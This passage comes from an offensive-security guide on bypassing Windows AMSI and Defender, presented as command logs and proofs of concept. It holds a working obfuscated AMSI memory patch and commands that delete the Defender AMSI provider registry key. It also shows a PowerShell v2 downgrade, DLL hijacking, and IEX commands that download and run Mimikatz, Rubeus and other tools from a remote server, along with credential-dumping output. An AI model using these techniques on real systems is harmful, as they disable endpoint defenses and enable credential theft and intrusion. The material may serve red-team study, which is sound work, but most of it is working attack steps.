*Evil-WinRM* PS C:\Users\Administrator\Documents> IEX (New-Object Net.WebClient).DownloadString('http://192.168.1.144:8080/PatchingInMemory-part3.ps1');

*Evil-WinRM* PS C:\Users\Administrator\Documents>

=> The AMSI.dll has been pacthed. We can now download and execute any malicious scripts and tools such as the hacking tool 'Mimikatz' for this PoC.

*Evil-WinRM* PS C:\Users\Administrator\Documents> IEX (New-Object Net.WebClient).DownloadString('http://192.168.1.144:8080/SuperMimiCustom.ps1');


*Evil-WinRM* PS C:\Users\Administrator\Documents> invoke-mimi-custom

  .#####.   mimikatz 2.2.0 (x64) #19041 Sep 20 2021 19:01:18
 .## ^ ##.  "A La Vie, A L'Amour" - (oe.eo)
 ## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )
 ## \ / ##       > https://blog.gentilkiwi.com/mimikatz
 '## v ##'       Vincent LE TOUX             ( vincent.letoux@gmail.com )
  '#####'        > https://pingcastle.com / https://mysmartlogon.com ***/

mimikatz(powershell) # sekurlsa::logonpasswords

Authentication Id : 0 ; 195153 (00000000:0002fa51)
Session           : Interactive from 1
User Name         : Administrator
Domain            : SERVER-WIN2022
Logon Server      : SERVER-WIN2022
Logon Time        : 5/2/2025 11:25:21 AM
SID               : S-1-5-21-3336774573-1234467604-3718094125-500
        msv :
         [00000003] Primary
         * Username : Administrator
         * Domain   : SERVER-WIN2022
         * NTLM     : 6699270562fdbd1e74c7d369c<SNIP>
         * SHA1     : 62c9d420fbebe8aca4f082465<SNIP>
         * DPAPI    : 62c9d420fbebe8aca4f082465<SNIP>
        tspkg :
<SNIP>


----------------------------------------------------------------------------------------------------------------------------
PoC n°2 - Windows 10 laptop (with Microsoft Defender AV) - Test as a local administrator user but without an elevated shell
----------------------------------------------------------------------------------------------------------------------------

Windows PowerShell
Copyright (C) Microsoft Corporation. All rights reserved.

Try the new cross-platform PowerShell https://aka.ms/pscore6

PS C:\Users\Administrator> $PSversiontable

Name                           Value
----                           -----
PSVersion                      5.1.19041.5737
PSEdition                      Desktop
PSCompatibleVersions           {1.0, 2.0, 3.0, 4.0...}
BuildVersion                   10.0.19041.5737
CLRVersion                     4.0.30319.42000
WSManStackVersion              3.0
PSRemotingProtocolVersion      2.3
SerializationVersion           1.1.0.1


PS C:\Users\Administrator> Get-MpComputerStatus | Select AntivirusEnabled, RealTimeProtectionEnabled, IoavProtectionEnabled, AntispywareEnabled, 
			   AntivirusSignatureLastUpdated | FL

AntivirusEnabled              : True
RealTimeProtectionEnabled     : True
IoavProtectionEnabled         : True
AntispywareEnabled            : True
AntivirusSignatureLastUpdated : 5/1/2025 6:27:04 AM


PS C:\Users\Administrator> ${_/==\_/\__/===\_/} = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('dQBzAGkAbgBnACAAUwB5AHMAdABlAG0AOwA
>> NAAoAdQBzAGkAbgBnACAAUwB5AHMAdABlAG0ALgBSAHUAbgB0AGkAbQBlAC4ASQBuAHQAZQByAG8AcABTAGUAcgB2AGkAYwBlAHMAOwANAAoAcAB1AGIAbABpAGMAIABjAGwAYQBzAHMAIABXAGkAbgA
>> zADIAIAB7AA0ACgAgACAAIAAgAFsARABsAGwASQBtAHAAbwByAHQAKAAiAGsAZQByAG4AZQBsADMAMgAiACkAXQANAAoAIAAgACAAIABwAHUAYgBsAGkAYwAgAHMAdABhAHQAaQBjACAAZQB4AHQAZQB
>> yAG4AIABJAG4AdABQAHQAcgAgAEcAZQB0AFAAcgBvAGMAQQBkAGQAcgBlAHMAcwAoAEkAbgB0AFAAdAByACAAaABNAG8AZAB1AGwAZQAsACAAcwB0AHIAaQBuAGcAIABwAHIAbwBjAE4AYQBtAGUAKQA
>> 7AA0ACgAgACAAIAAgAFsARABsAGwASQBtAHAAbwByAHQAKAAiAGsAZQByAG4AZQBsADMAMgAiACkAXQANAAoAIAAgACAAIABwAHUAYgBsAGkAYwAgAHMAdABhAHQAaQBjACAAZQB4AHQAZQByAG4AIA
>> BJAG4AdABQAHQAcgAgAEwAbwBhAGQATABpAGIAcgBhAHIAeQAoAHMAdAByAGkAbgBnACAAbgBhAG0AZQApADsADQAKACAAIAAgACAAWwBEAGwAbABJAG0AcABvAHIAdAAoACIAawBlAHIAbgBlAGwAM
>> wAyACIAKQBdAA0ACgAgACAAIAAgAHAAdQBiAGwAaQBjACAAcwB0AGEAdABpAGMAIABlAHgAdABlAHIAbgAgAGIAbwBvAGwAIABWAGkAcgB0AHUAYQBsAFAAcgBvAHQAZQBjAHQAKABJAG4AdABQAHQ
>> AcgAgAGwAcABBAGQAZAByAGUAcwBzACwAIABVAEkAbgB0AFAAdAByACAAZAB3AFMAaQB6AGUALAAgAHUAaQBuAHQAIABmAGwATgBlAHcAUAByAG8AdABlAGMAdAAsACAAbwB1AHQAIAB1AGkAbgB0A
>> CAAbABwAGYAbABPAGwAZABQAHIAbwB0AGUAYwB0ACkAOwANAAoAfQA=')))
PS C:\Users\Administrator> Add-Type ${_/==\_/\__/===\_/}
PS C:\Users\Administrator> ${___/====\__/=====} = [Win32]::GetProcAddress(${__/=\/==\/\_/=\_/}, $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QQBtAHMAaQA=')))+
$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBjAGEAbgA='))) + $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QgB1AGYAZgBlAHIA'))))
PS C:\Users\Administrator> ${/==\_/=\/\__/\/\/} = 0
PS C:\Users\Administrator> [Win32]::VirtualProtect(${___/====\__/=====}, [uint32]5, 0x40, [ref]${/==\_/=\/\__/\/\/})
True
PS C:\Users\Administrator> ${_/\__/=\/\___/==\} = [Byte[]] (0xB8, 0x57, 0x00, 0x07, 0x80, 0xC3)
PS C:\Users\Administrator> [System.Runtime.InteropServices.Marshal]::Copy(${_/\__/=\/\___/==\}, 0, ${___/====\__/=====}, 6)

PS C:\Users\Administrator>

=> To verify that the AMSI has been successfully patched we can type the command "invoke-mimikatz" that should not been catched anymore by Microsoft Defender.
   Result : the command is not detected :-) 

PS C:\Users\Administrator> invoke-mimikatz
invoke-mimikatz : The term 'invoke-mimikatz' is not recognized as the name of a cmdlet, function, script file, or operable program. Check the spelling of the name, or if a path was
included, verify that the path is correct and try again.
At line:1 char:1
+ invoke-mimikatz
+ ~~~~~~~~~~~~~~~
    + CategoryInfo          : ObjectNotFound: (invoke-mimikatz:String) [], CommandNotFoundException
    + FullyQualifiedErrorId : CommandNotFoundException


=> We can now download and execute any malicious scripts and tools such as the hacking tool 'Rubeus' for this PoC.

PS C:\Users\Administrator> IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/S3cur3Th1sSh1t/PowerSharpPack/refs/heads/master/PowerSharpBinaries/Invoke-Rubeus.ps1');

PS C:\Users\Administrator> invoke-rubeus

cmdlet Invoke-Rubeus at command pipeline position 1
Supply values for the following parameters:
Command: help

   ______        _
  (_____ \      | |
   _____) )_   _| |__  _____ _   _  ___
  |  __  /| | | |  _ \| ___ | | | |/___)
  | |  \ \| |_| | |_) ) ____| |_| |___ |
  |_|   |_|____/|____/|_____)____/(___/

  v2.3.1

 Ticket requests and renewals:

    Retrieve a TGT based on a user password/hash, optionally saving to a file or applying to the current logon session or a specific LUID:
        DreiKopfHund.exe asktgt /user:USER </password:PASSWORD [/enctype:DES|RC4|AES128|AES256] | /des:HASH | /rc4:HASH | /aes128:HASH | /aes256:HASH> [/domain:DOMAIN] 
        [/dc:DOMAIN_CONTROLLER] [/outfile:FILENAME] [/ptt] [/luid] [/nowrap] [/opsec] [/nopac] [/oldsam] [/proxyurl:https://KDC_PROXY/kdcproxy] [/suppenctype:DES|RC4|AES128|AES256] 
        [/principaltype:principal|enterprise|x500|srv_xhost|srv_host|srv_inst]

    Retrieve a TGT based on a user password/hash, start a /netonly process, and to apply the ticket to the new process/logon session:
        DreiKopfHund.exe asktgt /user:USER </password:PASSWORD [/enctype:DES|RC4|AES128|AES256] | /des:HASH | /rc4:HASH | /aes128:HASH | /aes256:HASH> /createnetonly:C:\Windows\System32\cmd.exe
        [/show] [/domain:DOMAIN] [/dc:DOMAIN_CONTROLLER] [/nowrap] [/opsec] [/nopac] [/oldsam] [/proxyurl:https://KDC_PROXY/kdcproxy] [/suppenctype:DES|RC4|AES128|AES256] 
        [/principaltype:principal|enterprise|x500|srv_xhost|srv_host|srv_inst]

<SNIP>

----------------------------------------------------------------------------------------------------------------------------
PoC n°3 - Windows 10 laptop (with Microsoft Defender AV) - Test as a local administrator user but without an elevated shell
----------------------------------------------------------------------------------------------------------------------------

I used the tool "Sharp-Killer".
=> Lifetime AMSI bypass by @ZeroMemoryEx ported to .NET Framework 4.8 
=> https://github.com/S1lkys/SharpKiller

Step 1 - I obfuscated the tool "Sharp-Killer" with the packer "Confuser-EX"
<snip>
[DEBUG] Executing 'Anti-tamper module writer preparation' phase...
[DEBUG] Executing 'Anti-debug injection' phase...
[DEBUG] Executing 'Anti-dump injection' phase...
[DEBUG] Executing 'Anti-ILDasm marking' phase...
[DEBUG] Executing 'Encoding reference proxies' phase...
[DEBUG] Executing 'Constant encryption helpers injection' phase...
[DEBUG] Executing 'Resource encryption helpers injection' phase...
[DEBUG] Executing 'Type scrambler' phase...
[DEBUG] Executing 'Constants encoding' phase...
[DEBUG] Executing 'Hardening Phase' phase...
[DEBUG] Executing 'Anti-tamper helpers injection' phase...
[DEBUG] Executing 'Control flow mangling' phase...
[DEBUG] Executing 'Post-renaming' phase...
[DEBUG] Executing 'Anti-tamper metadata preparation' phase...
[DEBUG] Executing 'Apply watermark' phase...
[DEBUG] Executing 'Anti-tamper module writer preparation' phase...
[DEBUG] Executing 'Anti-debug injection' phase...
[DEBUG] Executing 'Anti-dump injection' phase...
[DEBUG] Executing 'Anti-ILDasm marking' phase...
[DEBUG] Executing 'Encoding reference proxies' phase...
[DEBUG] Executing 'Constant encryption helpers injection' phase...
[DEBUG] Executing 'Resource encryption helpers injection' phase...
[DEBUG] Executing 'Type scrambler' phase...
[DEBUG] Executing 'Constants encoding' phase...
[DEBUG] Executing 'Hardening Phase' phase...
[DEBUG] Executing 'Anti-tamper helpers injection' phase...
[DEBUG] Executing 'Control flow mangling' phase...
[DEBUG] Executing 'Post-renaming' phase...
[DEBUG] Executing 'Anti-tamper metadata preparation' phase...
[DEBUG] Executing 'Apply watermark' phase...
<SNIP>

Step 2 - I executed the packed version of "Sharp-Killer" to successfully patch the AMSI.dll in my PowerShell session...

PS C:\Users\auditor> invoke-mimikatz
At line:1 char:1
+ invoke-mimikatz
+ ~~~~~~~~~~~~~~~
This script contains malicious content and has been blocked by your antivirus software.
    + CategoryInfo          : ParserError: (:) [], ParentContainsErrorRecordException
    + FullyQualifiedErrorId : ScriptContainedMaliciousContent

PS C:\Users\auditor> Get-MpComputerStatus | Select AntivirusEnabled, RealTimeProtectionEnabled, IoavProtectionEnabled, AntispywareEnabled, AntivirusSignatureLastUpdated | FL

AntivirusEnabled              : True
RealTimeProtectionEnabled     : True
IoavProtectionEnabled         : True
AntispywareEnabled            : True
AntivirusSignatureLastUpdated : 5/8/2025 4:35:53 PM

PS C:\Users\auditor>

PS C:\Users\auditor> Super-Sharp-K1ll3r.exe

	Monitoring for Powershell.exe
	[+] AMSI Patched: 10488
	exit

PS C:\Users\auditor> invoke-mimikatz
invoke-mimikatz : The term 'invoke-mimikatz' is not recognized as the name of a cmdlet, function, script file, or
operable program. Check the spelling of the name, or if a path was included, verify that the path is correct and try
again.
At line:1 char:1
+ invoke-mimikatz
+ ~~~~~~~~~~~~~~~
    + CategoryInfo          : ObjectNotFound: (invoke-mimikatz:String) [], CommandNotFoundException
    + FullyQualifiedErrorId : CommandNotFoundException

=> No more AMSI  :)


---------------------------------------------------------------------------------------------------------------------------------------------------
➤ AMSI bypass technique 3 - Modify a Windows registry key to disable the AMSI (admin priv required)
---------------------------------------------------------------------------------------------------------------------------------------------------

AMSI Providers are responsible for the scanning process by the antivirus product and are registered in a location in the registry. 
The GUID for Microsoft Defender is: HKLM:\SOFTWARE\Microsoft\AMSI\Providers\{2781761E-28E0-4109-99FE-B9D127C57AFE}
We can remove the registry key to bypass/disable the AMSI if we have local administrator privileges but it is not stealth.

PS C:\> reg query HKLM\SOFTWARE\Microsoft\AMSI\Providers\

    HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\AMSI\Providers\{2781761E-28E0-4109-99FE-B9D127C57AFE}

PS C:\> Remove-Item -Path "HKLM:\SOFTWARE\Microsoft\AMSI\Providers\{2781761E-28E0-4109-99FE-B9D127C57AFE}" -Recurse


---------------------------------------------------------------------------------------------------------------------------------------------------
➤ AMSI bypass technique 4 - PowerShell downgrade attack (use PowerShell version 2 which doesn't support AMSI)
---------------------------------------------------------------------------------------------------------------------------------------------------

Even though that Windows PowerShell 2.0 has been deprecated by Microsoft, in many companies it hasn’t been removed from all the Windows systems
due to "technical debt" issues and for compatibilty reason with old applications.
Older versions of PowerShell (v1 and v2) don't contain newer security features that Microsoft has implemented such as AMSI protection and PowerShell script-block logging. 

Note: With PowerShell version 2 we can used the "old" offensive framework such as PowerSploit, Nishang, etc.                    
(https://github.com/PowerShellMafia/PowerSploit/CodeExecution/)

---------------------------------------------------------
PoC - Test with a Windows 2019 server (with Defender AV)
---------------------------------------------------------

PS C:\Temp> systeminfo

Host Name:                 WEB-SERVER-2K19
OS Name:                   Microsoft Windows Server 2019 Datacenter
<SNIP>

C:\Temp> powershell -version 2
Windows PowerShell
Copyright (C) 2009 Microsoft Corporation. All rights reserved.

PS C:\Temp> $PSversiontable

Name                           Value
----                           -----
CLRVersion                     2.0.50727.9179
BuildVersion                   6.1.7600.16385
PSVersion                      2.0
WSManStackVersion              2.0
PSCompatibleVersions           {1.0, 2.0}
SerializationVersion           1.1.0.1
PSRemotingProtocolVersion      2.1


PS C:\Users\pentester> Get-MpComputerStatus | Select AntivirusEnabled, RealTimeProtectionEnabled, IoavProtectionEnabled, AntispywareEnabled | FL

AntivirusEnabled              : True
RealTimeProtectionEnabled     : True
IoavProtectionEnabled         : True
AntispywareEnabled            : True


PS C:\Temp> $a = get-content .\obfuscated-mimi.txt
PS C:\Temp> $b = [System.Convert]::FromBase64String($a)
PS C:\Temp> $c = [System.Text.Encoding]::UTF8.GetString($b)
PS C:\Temp> iex ($c)

PS C:\Temp> invoke-mimi

  .#####.   mimikatz 2.2.0 (x64) #19041 Jul 24 2021 11:00:11
 .## ^ ##.  "A La Vie, A L'Amour" - (oe.eo)
 ## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )
 ## \ / ##       > https://blog.gentilkiwi.com/mimikatz
 '## v ##'       Vincent LE TOUX             ( vincent.letoux@gmail.com )
  '#####'        > https://pingcastle.com / https://mysmartlogon.com ***/

mimikatz(powershell) # coffee

    ( (
     ) )
  .______.
  |      |]
  \      /
   `----'

mimikatz(powershell) # exit
Bye!


---------------------------------------------------------------------------------------------------------------------------------------------------
➤ AMSI bypass technique 5 - AMSI dll hijacking
---------------------------------------------------------------------------------------------------------------------------------------------------

DLL Hijacking can be used to evade AMSI by creating a non-legitimate amsi.dll file and plant it on the same folder as PowerShell.

=> https://sensepost.com/blog/2020/resurrecting-an-old-amsi-bypass/
      
---------------------------------------------------------
PoC - Windows 10 laptop (protected by Microsoft Defender)
---------------------------------------------------------

Step 1 - Copy all the PowerShell files (x64) in the folder "C:\temp\PowerShell-v1.0-win-x64\"
         Rename "Powershell.exe" as "SuperPowerSHELL.exe"
Step 2 - Create and plant a fake "amsi.dll" file in the "C:\temp" folder
Step 3 - Execute PowerShell from the "C:\temp" => it will load the fake "amsi.dll" file preventing the real AMSI to be initiated.
Step 4 - Download and execute straight into memory the hacking tool "mimikatz" as a PoC.


Microsoft Windows [Version 10.0.19045.5737]
(c) Microsoft Corporation. All rights reserved.

C:\Windows\system32> systeminfo

Host Name:                 POXXXXXXX
OS Name:                   Microsoft Windows 10 Professionnel
OS Version:                10.0.19045 N/A Build 19045
OS Manufacturer:           Microsoft Corporation
OS Configuration:          Member Workstation
OS Build Type:             Multiprocessor Free
<SNIP>

C:\Windows\system32> cd C:\Temp\PowerShell-v1.0-win-x64

C:\Temp\PowerShell-v1.0-win-x64>dir
 Volume in drive C is Windows
 Volume Serial Number is F06E-DC58

 Directory of C:\Temp\PowerShell-v1.0-win-x64

05/03/2025  02:39 AM    <DIR>          .
05/03/2025  02:39 AM    <DIR>          ..
03/26/2025  06:10 PM             7,680 Amsi.dll
05/03/2025  02:39 AM    <DIR>          en
05/03/2025  02:39 AM    <DIR>          en-US
03/26/2025  06:17 PM    <DIR>          Examples
05/03/2025  02:39 AM    <DIR>          fr
05/03/2025  02:39 AM    <DIR>          fr-FR
05/03/2025  02:39 AM    <DIR>          Modules
12/07/2019  11:10 AM               395 powershell.exe.config
12/06/2019  07:05 PM           212,992 powershell_ise.exe
10/15/2019  03:50 PM               465 powershell_ise.exe.config
09/03/2024  07:09 PM            56,320 PSEvents.dll
12/07/2019  11:09 AM           174,592 pspluginwkr.dll
12/07/2019  11:10 AM             2,560 pwrshmsg.dll
11/18/2023  11:35 PM            30,720 pwrshsip.dll
03/26/2025  06:17 PM    <DIR>          Schemas
12/07/2019  11:14 AM    <DIR>          SessionConfig
02/18/2024  04:43 PM           455,680 SuperPowerSHELL.exe
03/26/2025  06:13 PM         2,187,193 Test.txt
12/07/2019  11:10 AM            16,598 WSMan.Format.ps1xml
              11 File(s)      3,145,195 bytes
              10 Dir(s)  125,671,903,232 bytes free

C:\Temp\PowerShell-v1.0-win-x64>SuperPowerSHELL.exe
Windows PowerShell
Copyright (C) Microsoft Corporation. All rights reserved.

Try the new cross-platform PowerShell https://aka.ms/pscore6

PS C:\Temp\PowerShell-v1.0-win-x64> IEX (New-Object Net.WebClient).DownloadString('http://192.168.1.144:8080/SuperMimiCustom.csv');
PS C:\Temp\PowerShell-v1.0-win-x64> invoke-mimi-custom


  .#####.   mimikatz 2.2.0 (x64) #19041 Sep 20 2021 19:01:18
 .## ^ ##.  "A La Vie, A L'Amour" - (oe.eo)
 ## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )
 ## \ / ##       > https://blog.gentilkiwi.com/mimikatz
 '## v ##'       Vincent LE TOUX             ( vincent.letoux@gmail.com )
  '#####'        > https://pingcastle.com / https://mysmartlogon.com ***/

mimikatz(powershell) # sekurlsa::logonpasswords

Authentication Id : 0 ; 1049710 (00000000:0010046e)
Session           : Interactive from 1
User Name         : auditor
Domain            : LAB
Logon Server      : DC3
Logon Time        : 4/29/2025 5:05:09 PM
SID               : S-1-5-21-666114207-261065646-224150901-1121
        msv :
         [00000003] Primary
         * Username : auditor
         * Domain   : LAB
         * NTLM     : 01c3e95ac8caca39656219<SNIP>
         * SHA1     : 34bdcf396abb37a4ad181a<SNIP>
         * DPAPI    : ed5d6484fd4e412f2a9659<SNIP>


===================================================================================================================================================
V.   Tools that bypass AV products (AMSI+ETW patching) and allow to load and execute straight in-memory offensive .Net assemblies
===================================================================================================================================================

There are many open-source tools on GitHub that allow to patch the AMSI (+ the event tracing i.e. ETW) and to load .Net assemblies (C#) from a remote web 
server URL or from a local directory.

Examples of tools
------------------
=> PowerSharpPack 	- https://github.com/S3cur3Th1sSh1t/PowerSharpPack
=> Invoke-SharpLoader	- https://github.com/S3cur3Th1sSh1t/Invoke-SharpLoader
=> NetLoader 		- https://github.com/Flangvik/NetLoader
=> EAPrimer 		- https://github.com/m8sec/EAPrimer
=> ExecRemoteNET	- https://github.com/m1ddl3w4r3/ExecRemoteNET
=> ...


---------------------------------------------------------------------------------------------------------------------------------------------------
➤ Test 1 - PoC with 'EAPrimer' on a Windows server 2022 (protected by MS Defender AV) 
            -> Download & execution in-memory of hacking tools without detection
---------------------------------------------------------------------------------------------------------------------------------------------------

The tool "EAPrimer" can be used to load .Net assemblies (C#) from a filepath (local directory) or a URL. 
On startup, it will attempt to perform in-memory patching of AMSI to bypass detection. 
By default, the output is written to the console, however, this can be directed to a file or even sent via HTTP POST request to a remote server.

=> https://github.com/m8sec/EAPrimer

Reminder: 
- An assembly is a collection of types and resources that are built to work together and form a logical unit of functionality. 
- Assemblies take the form of executable (.exe) or dynamic link library (.dll) files, and are the building blocks of .NET applications.

Important note
---------------
=> I obfuscated and recompiled the source code of the tool to avoid its detection by the MS Defender antivirus.


┌──(kali㉿kali)-[~]
└─$ evil-winrm -i 192.168.1.11 -u administrator -p <SNIP>

Evil-WinRM shell v3.5

*Evil-WinRM* PS C:\Users\Administrator\Documents> dir

    Directory: C:\Users\Administrator\Documents

Mode                 LastWriteTime         Length Name
----                 -------------         ------ ----
-a----         4/10/2023   4:41 PM          20480 Obfuscated-EA-Primer.exe
-a----          5/2/2025   5:51 PM           5988 test.txt


*Evil-WinRM* PS C:\Users\Administrator\Documents> systeminfo

Host Name:                 SERVER-WIN2022
OS Name:                   Microsoft Windows Server 2022 Standard Evaluation
OS Version:                10.0.20348 N/A Build 20348
OS Manufacturer:           Microsoft Corporation
OS Configuration:          Standalone Server
OS Build Type:             Multiprocessor Free
Registered Owner:          Windows User
Registered Organization:
Product ID:                00454-40000-00001-AA898
Original Install Date:     5/2/2025, 10:44:40 AM
<SNIP>


*Evil-WinRM* PS C:\Users\Administrator\Documents> Get-MpComputerStatus | Select AntivirusEnabled, RealTimeProtectionEnabled, IoavProtectionEnabled, AntispywareEnabled,
						  AntivirusSignatureLastUpdated | FL

AntivirusEnabled              : True
RealTimeProtectionEnabled     : True
IoavProtectionEnabled         : True
AntispywareEnabled            : True
AntivirusSignatureLastUpdated : 5/2/2025 7:55:30 AM


*Evil-WinRM* PS C:\Users\Administrator\Documents> ./Obfuscated-EA-Primer.exe -path=http://192.168.1.144:8080/SharpSecDump.exe -args='-target=localhost'

[*] EAPrimer v0.1.2
[*] Applying In-Memory Patch
[*] Assembly Args: "-target=localhost"
[*] Loading Asembly: http://192.168.1.144:8080/SharpSecDump.exe
[*] RemoteRegistry service started on localhost
[*] Parsing SAM hive on localhost
[*] Parsing SECURITY hive on localhost
[*] Sucessfully cleaned up on localhost
---------------Results from localhost---------------
[*] SAM hashes
Administrator:500:aad3b435b51404eeaad3b435b51404ee:6699270562fdbd1e74c7<snip>
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c0<snip>
DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73<snip>
WDAGUtilityAccount:504:aad3b435b51404eeaad3b435b51404ee:5970404680bafc1<snip>
[*] Cached domain logon information(domain/username:hash)
[*] LSA Secrets
[*] DPAPI_SYSTEM
dpapi_machinekey:d3188b46fabab60b285682fd45ede236<snip>
dpapi_userkey:3204da5913299b84721884babfe89089582<snip>
[*] NL$KM
NL$KM:eaf6c281bf8b382293e87ad476a3dc27ee89f36779851e5a6f642d8621184a10762ffa62f182990621b4febb48923d11911ffcfd27b<snip>
---------------Script execution completed---------------


*Evil-WinRM* PS C:\Users\Administrator\Documents> ./Obfuscated-EA-Primer.exe -path=http://192.168.1.144:8080/Rubeus-v2.2.2.exe -args=triage
[*] EAPrimer v0.1.2
[*] Applying In-Memory Patch
[*] Assembly Args: "triage"
[*] Loading Asembly: http://192.168.1.144:8080/Rubeus-v2.2.2.exe

   ______        _
  (_____ \      | |
   _____) )_   _| |__  _____ _   _  ___
  |  __  /| | | |  _ \| ___ | | | |/___)
  | |  \ \| |_| | |_) ) ____| |_| |___ |
  |_|   |_|____/|____/|_____)____/(___/

  v2.2.2

Action: Triage Kerberos Tickets (All Users)

[*] Current LUID    : 0xe8e890

 ---------------------------------------
 | LUID | UserName | Service | EndTime |
 ---------------------------------------
 ---------------------------------------


---------------------------------------------------------------------------------------------------------------------------------------------------
➤ Test 2 - PoC with 'ExecRemoteNET' on a Windows server 2022 (protected by MS Defender AV) 
            -> Download & execution in-memory of hacking tools without detection
---------------------------------------------------------------------------------------------------------------------------------------------------

=> https://github.com/m1ddl3w4r3/ExecRemoteNET
=> https://github.com/D1rkMtr/ExecRemoteAssembly (note: this repo does not exist anymore)

This tool allows to download and execute directly into memory a remote .Net assembly with:
> AMSI patching
> ETW patching
> arguments passing

Limitation: it can only run .NET assemblies that are based on C#.

Reminder: 
- An assembly is a collection of types and resources that are built to work together and form a logical unit of functionality. 
- Assemblies take the form of executable (.exe) or dynamic link library (.dll) files, and are the building blocks of .NET applications.


PoC - Download & execution straight into memory of Rubeus.exe & Seatbelt.exe on a Windows server 2022 (protected by MS Defender AV)
-----------------------------------------------------------------------------------------------------------------------------------

Windows PowerShell
Copyright (C) Microsoft Corporation. All rights reserved.

PS C:\Users\Administrator\Documents\ExecRemoteNet> Get-MpComputerStatus | Select AntivirusEnabled, RealTimeProtectionEnabled, IoavProtectionEnabled, AntispywareEnabled,
						   AntivirusSignatureLastUpdated | FL

AntivirusEnabled              : True
RealTimeProtectionEnabled     : True
IoavProtectionEnabled         : True
AntispywareEnabled            : True
AntivirusSignatureLastUpdated : 5/26/2025 6:31:01 AM


PS C:\Users\Administrator\Documents\ExecRemoteNet> ls

    Directory: C:\Users\Administrator\Documents\ExecRemoteNet

Mode                 LastWriteTime         Length Name
----                 -------------         ------ ----
-a----          5/2/2025   7:37 PM         288768 ExecRemoteNET.exe
-a----        12/12/2022  11:41 PM         928112 msvcp140d.dll


PS C:\Users\Administrator\Documents\ExecRemoteNet> .\ExecRemoteNET.exe http://192.168.1.144:8080/Rubeus.exe currentluid
[-] Failed to load amsi.dll
[+] Patched etw!
[+] Patched amsi!
[+] Patched amsi open session!
 ~ Execute Remote .NET Assembly ~

[+] Loading Remote PE from http://192.168.1.144:8080/Rubeus.exe
[+] Bytes: 467456
   ______        _
  (_____ \      | |
   _____) )_   _| |__  _____ _   _  ___
  |  __  /| | | |  _ \| ___ | | | |/___)
  | |  \ \| |_| | |_) ) ____| |_| |___ |
  |_|   |_|____/|____/|_____)____/(___/

  v2.3.3

[*] Action: Display current LUID

[*] Current LogonID (LUID) : 0x2e937b (3052411)

PS C:\Users\Administrator\Documents\ExecRemoteNet>


PS C:\Users\Administrator\Documents\ExecRemoteNet> ExecRemoteNet.exe http://192.168.1.144:8080/Seatbelt.exe -group=remote
[-] Failed to load amsi.dll
[+] Patched etw!
[+] Patched amsi!
[+] Patched amsi open session!
 ~ Execute Remote .NET Assembly ~

[+] Loading Remote PE from http://192.168.1.144:8080/Seatbelt.exe
[+] Bytes: 608256

                        %&&@@@&&
                        &&&&&&&%%%,                       #&&@@@@@@%%%%%%###############%
                        &%&   %&%%                        &////(((&%%%%%#%################//((((###%%%%%%%%%%%%%%%
%%%%%%%%%%%######%%%#%%####%  &%%**#                      @////(((&%%%%%%######################(((((((((((((((((((
#%#%%%%%%%#######%#%%#######  %&%,,,,,,,,,,,,,,,,         @////(((&%%%%%#%#####################(((((((((((((((((((
#%#%%%%%%#####%%#%#%%#######  %%%,,,,,,  ,,.   ,,         @////(((&%%%%%%%######################(#(((#(#((((((((((
#####%%%####################  &%%......  ...   ..         @////(((&%%%%%%%###############%######((#(#(####((((((((
#######%##########%#########  %%%......  ...   ..         @////(((&%%%%%#########################(#(#######((#####
###%##%%####################  &%%...............          @////(((&%%%%%%%%##############%#######(#########((#####
#####%######################  %%%..                       @////(((&%%%%%%%################
                        &%&   %%%%%      Seatbelt         %////(((&%%%%%%%%#############*
                        &%%&&&%%%%%        v1.2.2         ,(((&%%%%%%%%%%%%%%%%%,
                         #%%%%##,

====== AMSIProviders ======

  GUID                           : {2781761E-28E0-4109-99FE-B9D127C57AFE}
  ProviderPath                   : "C:\ProgramData\Microsoft\Windows Defender\Platform\4.18.25040.2-0\MpOav.dll"

====== AntiVirus ======

Cannot enumerate antivirus. root\SecurityCenter2 WMI namespace is not available on Windows Servers
====== AuditPolicyRegistry ======

<SNIP>


===================================================================================================================================================
VI.   Tools that bypass AV products and allow to load and execute straight in-memory offensive PE files
===================================================================================================================================================

There are many open-source tools on GitHub that allow to load and execute straight in-memory offensive PE files from a remote web server URL or from a local directory.

Examples of tools
------------------
> Pyramid		       - https://github.com/naksyn/Pyramid
> FilelessPELoader	       - https://github.com/SaadAhla/FilelessPELoader
> Invoke-PoSH-PePacker	       - https://github.com/Jean-Francois-C/Windows-Penetration-Testing/tree/master/Defense%20evasion%20(examples)/Invoke-PoSH-PePacker
> SharpReflectivePEInjection   - https://github.com/cpu0x00/SharpReflectivePEInjection
> ...


---------------------------------------------------------------------------------------------------------------------------------------------------
➤ Test 1 - PoC with my packer 'Invoke-PoSH-PePacker' on a Windows server 2022 protected by the MS Defender antivirus
            -> Download & execution in-memory of hacking tools without detection
---------------------------------------------------------------------------------------------------------------------------------------------------

> 'Invoke-PoSH-PePacker' allows to pack and encrypt offensive PE files in order to bypass AV solutions such as Windows Defender.
   It generates an obfuscated and encrypted PowerShell script that contains the PE file that you want to pack.

> https://github.com/Jean-Francois-C/Windows-Penetration-Testing/tree/master/Defense%20evasion%20(examples)/Invoke-PoSH-PePacker

> FEATURES
  - AES encryption and GZip/Deflate compression (based on 'Xencrypt')
  - Reflective PE injection (based on an updated version of 'Invoke-ReflectivePEInjection')
  - AMSI bypass (pseudo random)
  - Blocking Event Tracing (ETW) for Windows (i.e. disable script-block logging within current PoSH process)
  - Disabling PowerShell history logging
  - Basic sandbox evasion techniques (optional)
    + stop/exit if the PowerShell script is not run on a domain-joined Windows computer
    + wait for 60 seconds before execution


- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Step 1 - Generate a PowerShell script that embeded the hacking tool 'Mimikatz'
         (note: during this step, I disabled temporarily my AV on my attacker Windows laptop)
